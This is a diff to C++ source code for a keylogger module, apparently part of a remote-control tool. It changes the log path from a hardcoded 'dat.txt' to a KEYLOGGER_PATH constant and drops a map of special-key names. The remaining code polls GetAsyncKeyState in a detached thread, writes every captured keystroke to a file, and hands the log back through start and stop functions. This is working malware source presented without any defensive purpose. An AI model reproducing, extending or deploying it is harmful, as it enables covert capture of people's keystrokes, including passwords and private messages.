@@ -1,60 +1,10 @@
 #include "syscalls.h"
 
 std::atomic<bool> keyloggerRunning = false;
-const std::map<int, std::string> specialKeys = {
-	{VK_SPACE, "#SPACE"},
-	{VK_RETURN, "#RETURN"},
-	{VK_BACK, "#BACKSPACE"},
-	{VK_LBUTTON, "#L_CLICK"},
-	{VK_RBUTTON, "#R_CLICK"},
-	{VK_CAPITAL, "#CAPS_LOCK"},
-	{VK_TAB, "#TAB"},
-	{VK_UP, "#UP_ARROW_KEY"},
-	{VK_DOWN, "#DOWN_ARROW_KEY"},
-	{VK_LEFT, "#LEFT_ARROW_KEY"},
-	{VK_RIGHT, "#RIGHT_ARROW_KEY"},
-	{VK_CONTROL, "#CONTROL"},
-	{VK_MENU, "#ALT"},
-	{VK_ESCAPE, "#ESCAPE"},
-	{VK_END, "#END"},
-	{VK_HOME, "#HOME"},
-	{VK_INSERT, "#INSERT"},
-	{VK_DELETE, "#DELETE"},
-	{VK_SHIFT, "#SHIFT"},
-	{VK_LSHIFT, "#LEFT_SHIFT"},
-	{VK_RSHIFT, "#RIGHT_SHIFT"},
-	{VK_LCONTROL, "#LEFT_CONTROL"},
-	{VK_RCONTROL, "#RIGHT_CONTROL"},
-	{VK_LMENU, "#LEFT_ALT"},
-	{VK_RMENU, "#RIGHT_ALT"},
-	{VK_LWIN, "#LEFT_WINDOWS"},
-	{VK_RWIN, "#RIGHT_WINDOWS"},
-	{VK_SNAPSHOT, "#PRINT_SCREEN"},
-	{VK_SCROLL, "#SCROLL_LOCK"},
-	{VK_PAUSE, "#PAUSE"},
-	{VK_F1, "#F1"},
-	{VK_F2, "#F2"},
-	{VK_F3, "#F3"},
-	{VK_F4, "#F4"},
-	{VK_F5, "#F5"},
-	{VK_F6, "#F6"},
-	{VK_F7, "#F7"},
-	{VK_F8, "#F8"},
-	{VK_F9, "#F9"},
-	{VK_F10, "#F10"},
-	{VK_F11, "#F11"},
-	{VK_F12, "#F12"},
-	{VK_NUMLOCK, "#NUM_LOCK"},
-	{VK_MULTIPLY, "#NUMPAD_MULTIPLY"},
-	{VK_ADD, "#NUMPAD_ADD"},
-	{VK_SUBTRACT, "#NUMPAD_SUBTRACT"},
-	{VK_DECIMAL, "#NUMPAD_DECIMAL"},
-	{VK_DIVIDE, "#NUMPAD_DIVIDE"}
-};
 
 void LOG(std::string input) {
 	std::fstream LogFile;
-	LogFile.open("dat.txt", std::fstream::app);
+	LogFile.open(KEYLOGGER_PATH, std::fstream::app);
 	if (LogFile.is_open()) {
 		LogFile << input << " ";
 		LogFile.close();
@@ -81,7 +31,7 @@ static void Keylogger()
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
 					std::fstream LogFile;
-					LogFile.open("dat.txt", std::fstream::app);
+					LogFile.open(KEYLOGGER_PATH, std::fstream::app);
 					if (LogFile.is_open()) {
 						LogFile << char(KEY) << " ";
 						LogFile.close();
@@ -100,7 +50,7 @@ bool startKeylogger(std::string& result) {
 	}
 	keyloggerRunning = true;
 
-	remove("dat.txt");
+	std::filesystem::remove(KEYLOGGER_PATH);
 
 	std::thread t(Keylogger);
 	t.detach();
@@ -117,7 +67,7 @@ bool stopKeylogger(std::string& result, std::ifstream& file) {
 
 	keyloggerRunning = false;
 	result = "Keylogger stopped";
-	file.open("dat.txt", std::fstream::in);
+	file.open(KEYLOGGER_PATH, std::fstream::in);
 
 	return true;
 }
